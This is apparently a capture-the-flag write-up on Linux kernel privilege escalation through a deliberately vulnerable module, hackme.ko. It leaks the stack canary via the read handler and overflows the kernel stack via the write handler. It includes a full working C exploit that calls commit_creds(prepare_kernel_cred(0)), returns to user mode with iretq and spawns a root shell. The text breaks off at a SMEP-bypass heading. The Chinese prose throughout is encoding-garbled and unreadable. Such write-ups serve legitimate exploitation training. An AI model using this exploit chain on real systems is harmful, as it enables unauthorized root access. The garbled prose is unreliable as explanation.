<p><code>swapgs</code>ä¸­æ›´æ¢çš„<code>gs</code>æ¥è‡ªäºMSRå¯„å­˜å™¨</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241120204022830.png" alt="image-20241120204022830"></p>
<p>æ€»æ˜¯å½“å‰ä½¿ç”¨ä¸€ä¸ª,ç„¶åMSRè®°ä½å¦ä¸€ä¸ª</p>
<h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>è¿›ç¨‹æƒé™ç”±<code>task_struct</code>çš„æˆå‘˜<code>struct cred *cred</code>æ§åˆ¶</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype <span class="class"><span class="keyword">struct</span> <span class="title">cred</span></span></span><br><span class="line"><span class="class"><span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span> usage;</span><br><span class="line">    <span class="type">kuid_t</span> uid;</span><br><span class="line">    <span class="type">kgid_t</span> gid;</span><br><span class="line">    <span class="type">kuid_t</span> suid;</span><br><span class="line">    <span class="type">kgid_t</span> sgid;</span><br><span class="line">    <span class="type">kuid_t</span> euid;</span><br><span class="line">    <span class="type">kgid_t</span> egid;</span><br><span class="line">    <span class="type">kuid_t</span> fsuid;</span><br><span class="line">    <span class="type">kgid_t</span> fsgid;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> securebits;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_inheritable;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_permitted;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_effective;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_bset;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_ambient;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> jit_keyring;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">session_keyring</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">process_keyring</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">thread_keyring</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">request_key_auth</span>;</span></span><br><span class="line">    <span class="type">void</span> *security;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> non_rcu;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æƒ³è¦æå‡ä¸€ä¸ªæ™®é€šè¿›ç¨‹çš„æƒé™åˆ°<code>root</code>, å¯ä»¥æ‰¾ä¸€ä¸ª<code>root</code>è¿›ç¨‹çš„<code>cred</code>æŠ„è¿‡æ¥</p>
<p>ä¿®æ”¹è¿›ç¨‹<code>cred</code>çš„æ–¹æ³•:</p>
<p>1.è¦ä¹ˆæ„é€ <code>rop</code>é“¾è°ƒç”¨å†…æ ¸å‡½æ•°<code>commit_creds(&amp;init_cred);</code>,æŠ„<code>init</code>è¿›ç¨‹çš„<code>cred</code>æ›¿æ¢å½“å‰è¿›ç¨‹çš„</p>
<p>2.è¦ä¹ˆæœ‰ä¸€ä¸ªå†…æ ¸å†…å­˜ä»»æ„å†™çš„åˆ©ç”¨åŸè¯­, æ‰¾åˆ°å½“å‰è¿›ç¨‹<code>task_struct</code>, ç„¶åæ‰¾åˆ°<code>cred</code> , ç„¶åä¿®æ”¹ä¹‹</p>
<h3 id="commit-creds-init-cred"><a href="#commit-creds-init-cred" class="headerlink" title="commit_creds(&amp;init_cred);"></a>commit_creds(&amp;init_cred);</h3><p>è¿™å°±æœ‰ä¸€ä¸ªé—®é¢˜,æ€ä¹ˆæ‰èƒ½æ‰¾åˆ°<code>init</code>è¿›ç¨‹çš„<code>cred</code>?</p>
<p>æ€ä¹ˆæ‰èƒ½æ‰¾åˆ°<code>struct init_task</code>?</p>
<p><code>Linux 6.2</code>ä¹‹å‰æœ‰å¦ä¸€ä¸ªå‡½æ•°<code>prepare_kernel_cred</code>ç»™æˆ‘ä»¬ä»£åŠ³</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!new)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, new);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (daemon)</span><br><span class="line">        old = get_task_cred(daemon);</span><br><span class="line">    <span class="keyword">else</span>	<span class="comment">//daemon == NULLæ—¶è¿”å›init_cred</span></span><br><span class="line">        old = get_cred(&amp;init_cred);</span><br></pre></td></tr></table></figure>

<p>å½“å‚æ•°ä¸º<code>NULL</code>æ—¶, è¯¥å‡½æ•°è¿”å›<code>init_cred</code>,ä¹Ÿå°±æ˜¯<code>init_task</code>çš„<code>cred</code></p>
<p>å› æ­¤å¯ä»¥æ„é€ å †æ ˆ<code>rop</code>é“¾:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/elevation-of-privilege.png" alt="commit_creds(prepare_kernel_cred(NULL))"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">NULL</span> =&gt; rdi</span><br><span class="line">prepare_kernel_cred(rdi) =&gt; rax</span><br><span class="line">rax =&gt; rdi</span><br><span class="line">commit_creds(rdi)</span><br></pre></td></tr></table></figure>



<p>ä½†æ˜¯<code>Linux 6.2</code>åŠä¹‹åå¦‚æœå‚æ•°ä¸º<code>NULL</code>åˆ™ç›´æ¥è¿”å›<code>NULL</code>äº†, å«æ²¡æ³•ç©ºæ‰‹å¥—ç™½ç‹¼äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WARN_ON_ONCE(!daemon))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!new)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>











<h2 id="vulnerability-kernel-module"><a href="#vulnerability-kernel-module" class="headerlink" title="vulnerability kernel module"></a>vulnerability kernel module</h2><p>é¢˜ç›®æ‰€ç»™çš„å†…æ ¸æ¨¡å—<code>hackme.ko</code></p>
<p>æ¨¡å—çš„åˆå§‹åŒ–å‡½æ•°ä¸­è°ƒç”¨<code>misc_register</code>å‡½æ•°æ³¨å†Œäº†ä¸€ä¸ª<code>struct miscdevice </code>å­—ç¬¦æ‚é¡¹è®¾å¤‡</p>
<blockquote>
<p>å­—ç¬¦æ‚é¡¹è®¾å¤‡</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span>&#123;</span></span><br><span class="line">ã€€ã€€<span class="type">int</span> minor; <span class="comment">//æ‚é¡¹è®¾å¤‡çš„æ­¤è®¾å¤‡å·(å¦‚æœè®¾ç½®ä¸ºMISC_DYNAMIC_MINORï¼Œè¡¨ç¤ºç³»ç»Ÿè‡ªåŠ¨åˆ†é…æœªä½¿ç”¨çš„minor)</span></span><br><span class="line">ã€€ã€€<span class="type">const</span> <span class="type">char</span> *name;		<span class="comment">// /devç›®å½•ä¸‹çš„èŠ‚ç‚¹åç§°</span></span><br><span class="line">ã€€ã€€<span class="type">const</span> stuct file_operations *fops;<span class="comment">//é©±åŠ¨ä¸»é¢˜å‡½æ•°å…¥å£æŒ‡é’ˆ</span></span><br><span class="line">ã€€ã€€<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">ã€€ã€€<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">parent</span>;</span></span><br><span class="line">ã€€ã€€<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">this_device</span>;</span></span><br><span class="line">ã€€ã€€<span class="type">const</span> <span class="type">char</span> *nodename;<span class="comment">//</span></span><br><span class="line">ã€€ã€€<span class="type">mode_t</span> mode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å­—ç¬¦æ‚é¡¹è®¾å¤‡çš„ä¸»è®¾å¤‡å·è‡ªåŠ¨è¢«è®¾ç½®ä¸º<code>10</code>, æ¬¡è®¾å¤‡å·ç”±<code>minor</code>å­—æ®µå®šä¹‰</p>
<p><code>misc_register</code>æ³¨å†Œå­—ç¬¦æ‚é¡¹è®¾å¤‡æ—¶ä¼šè‡ªåŠ¨åœ¨<code>/dev/</code>ä¸‹åˆ›å»ºè®¾å¤‡èŠ‚ç‚¹æ–‡ä»¶, èŠ‚ç‚¹æ–‡ä»¶åç”±<code>name</code>å­—æ®µç»™å‡º, <code>nodename</code>è¡¨ç¤º<code>/dev/ä¸‹</code>çš„äºŒçº§ç›®å½•, å¦‚æœ<code>nodename</code>éç©ºåˆ™åˆ›å»ºèŠ‚ç‚¹æ–‡ä»¶<code>/dev/&lt;nodename&gt;/name</code></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000000440</span> hackme_misc     dd <span class="number">0F</span>Fh                 ; minor</span><br><span class="line">.data:<span class="number">0000000000000440</span>                                         ; DATA XREF: hackme_init+<span class="number">6</span>â†‘o</span><br><span class="line">.data:<span class="number">0000000000000440</span>                                         ; hackme_exit+<span class="number">1</span>â†‘o</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 db <span class="number">4</span> dup(<span class="number">0</span>)             ; <span class="string">&quot;hackme&quot;</span></span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq offset aHackme       ; name</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq offset hackme_fops   ; fops</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; <span class="built_in">list</span>.next</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; <span class="built_in">list</span>.prev</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; parent</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; this_device</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; groups</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; nodename</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dw <span class="number">0</span>                    ; mode</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 db <span class="number">6</span> dup(<span class="number">0</span>)</span><br><span class="line">.data:<span class="number">0000000000000440</span> _data           ends</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>fops</code>æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çš„è®¾å¤‡è¡Œä¸ºæŒ‡é’ˆè¡¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.rodata:<span class="number">0000000000000320</span> hackme_fops     file_operations &lt;offset __this_module, <span class="number">0</span>, offset hackme_read, \</span><br><span class="line">.rodata:<span class="number">0000000000000320</span>                                         ; DATA XREF: .data:hackme_miscâ†“o</span><br><span class="line">.rodata:<span class="number">0000000000000320</span>                                  offset hackme_write, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, \</span><br><span class="line">.rodata:<span class="number">0000000000000320</span>                                  offset hackme_open, <span class="number">0</span>, offset hackme_release, <span class="number">0</span>, <span class="number">0</span>, \</span><br><span class="line">.rodata:<span class="number">0000000000000320</span>                                  <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è‡ªå®šä¹‰äº†<code>read,write,open,release</code>å››ç§è¡Œä¸º</p>
<p>åœ¨<code>hackme_read</code>ä¸­å‘ç”Ÿäº†è¿™ä¹ˆä¸€ä¸ªäº‹:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kstack_buf1[0:size]@kernel stack  =&gt;  hackme_buf@kernel bss  =&gt;  user_data@user </span><br></pre></td></tr></table></figure>

<p>ç”±äº<code>size</code>ç”±ç”¨æˆ·æŒ‡å®š,å› æ­¤è¿™é‡Œå¯ä»¥æ³„éœ²å†…æ ¸å †æ ˆä¸Šçš„<code>canary</code>,ä»¥åŠå‡½æ•°è¿”å›åœ°å€,ä»¥æ­¤å¯ä»¥ç»•è¿‡<code>KASLR</code></p>
<p>åœ¨<code>hackme_write</code>ä¸­å‘ç”Ÿäº†è¿™ä¹ˆä¸€ä¸ªäº‹:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_data[0:size]@user  =&gt;  hackme_buf@kernel bss  =&gt;  kstack_buf2@kernel stack </span><br></pre></td></tr></table></figure>

<p>ç”±äº<code>size</code>ç”±ç”¨æˆ·æŒ‡å®š,å› æ­¤è¿™é‡Œå¯ä»¥å¾€å†…æ ¸å †æ ˆå†™å…¥ä»»æ„å­—èŠ‚,å­˜åœ¨å †æ ˆæº¢å‡º,å¯ä»¥æ„é€ <code>ROP</code>é“¾</p>
<p>æ€è·¯:</p>
<p>1.åœ¨hackme_readä¸­æ³„éœ²canaryä¸è¿”å›åœ°å€, ç»•è¿‡KASLR</p>
<p>2.åœ¨hackme_writeä¸­å †æ ˆæº¢å‡º, æ„é€ ROPé“¾</p>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="ret2user"><a href="#ret2user" class="headerlink" title="ret2user"></a>ret2user</h3><p>å‡è®¾æˆ‘ä»¬å…³é—­<code>smap,smep,kpti,kaslr,</code> åªè€ƒè™‘ç»•è¿‡<code>canary</code></p>
<p>1.åˆ©ç”¨<code>hackme_read</code>æ³„éœ²<code>canary</code></p>
<p>2.åˆ©ç”¨<code>hackme_write</code>ç»•è¿‡<code>canary</code>æ£€æŸ¥,ç»§ç»­æº¢å‡ºå†…æ ¸å †æ ˆ,æ„é€ <code>rop</code>é“¾æ¡</p>
<p>3.æ›´æ¢è¿›ç¨‹<code>creds</code>ææƒ, ä¹Ÿå°±æ˜¯æ‰§è¡Œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br></pre></td></tr></table></figure>

<p>åœ¨ç”¨æˆ·ç¨‹åºä¸­å†™<code>shellcode</code>å®ç°, ç„¶ååœ¨<code>rop</code>é“¾æ¡ä¸­<code>ret2shellcode</code></p>
<p>4.è¿”å›åˆ°ç”¨æˆ·æ€</p>
<p>ä¹Ÿå°±æ˜¯æ‰§è¡Œ<code>iret</code></p>
<p>åœ¨ç”¨æˆ·ç¨‹åºä¸­å†™<code>shellcode</code>å®ç°</p>
<p>5.èµ·<code>shell</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æœªå¼€å¯KASLRæ—¶,ä¸¤ä¸ªå‡½æ•°çš„åœ°å€</span></span><br><span class="line"><span class="type">size_t</span> addr_commit_creds = <span class="number">0xffffffff814c6410</span>;</span><br><span class="line"><span class="type">size_t</span> addr_prepare_kernel_cred = <span class="number">0xffffffff814c67f0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">size_t</span> canary;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs;</span><br><span class="line"><span class="type">size_t</span> user_ss;</span><br><span class="line"><span class="type">size_t</span> user_sp;</span><br><span class="line"><span class="type">size_t</span> user_rflags;</span><br><span class="line"><span class="type">size_t</span> user_rip;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_canary</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">overflow</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_state();   <span class="comment">//ä¿å­˜è¿›å…¥å†…æ ¸ä¹‹å‰çš„ç”¨æˆ·æ€ä¸Šä¸‹æ–‡</span></span><br><span class="line">    open_dev();     <span class="comment">//æ‰“å¼€è®¾å¤‡</span></span><br><span class="line">    leak_canary();  <span class="comment">//æ³„éœ²canary</span></span><br><span class="line">    overflow();     <span class="comment">//æº¢å‡º,ç»•è¿‡canary,æ„é€ ropé“¾</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] should never be reached&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>&#123;</span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/hackme&quot;</span>,O_RDWR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    user_rip = spawn_shell;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Saved state&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;movabs rax,addr_prepare_kernel_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rdi,rdi;&quot;</span></span><br><span class="line">        <span class="string">&quot;call rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,rax;&quot;</span>          <span class="comment">//init_task.creds -&gt; rdi</span></span><br><span class="line">        <span class="string">&quot;movabs rax,addr_commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;call rax;&quot;</span>             <span class="comment">//commit_creds(init_task.creds)</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_rip;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_canary</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    read(dev_fd,buffer,<span class="number">0xA8</span>);</span><br><span class="line">    canary = *(<span class="type">size_t</span>*)((<span class="type">char</span>*)buffer+<span class="number">0x80</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">overflow</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = (<span class="type">size_t</span>)&amp;privilege_escalation;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] overflow &quot;</span>);</span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>











<h3 id="bypass-SMEP"><a href="#bypass-SMEP" class="headerlink" title="bypass SMEP"></a>bypass SMEP</h3><p><code>smep(supervisor mode execution protection)</code>: å†…æ ¸æ€æ—¶ä¸å…è®¸æ‰§è¡Œç”¨æˆ·ç©ºé—´ä»£ç </p>
<p><code>smep</code>ç±»ä¼¼äºç”¨æˆ·æ€çš„NXçš„æ¦‚å¿µ,</p>
<p><code>NX</code>ä¸å…è®¸ç”¨æˆ·åœ¨å †æ ˆé‡Œæ‰§è¡Œ</p>
<p><code>smep</code>ä¸å…è®¸å†…æ ¸æ€æ‰§è¡Œç”¨æˆ·ä»£ç  , å†…æ ¸æ€åªèƒ½æ‰§è¡Œå†…æ ¸æ€çš„ä»£ç </p>
<p>ä¹‹å‰åœ¨å†…æ ¸å †æ ˆä¸­æ„é€ <code>rop</code>é“¾, ç›´æ¥è¿”å›åˆ°ç”¨æˆ·ä»£ç ,  ä¼šè¢«<code>smep</code>æ‹¦ä½</p>
<p>ç»•è¿‡æ–¹å¼:</p>
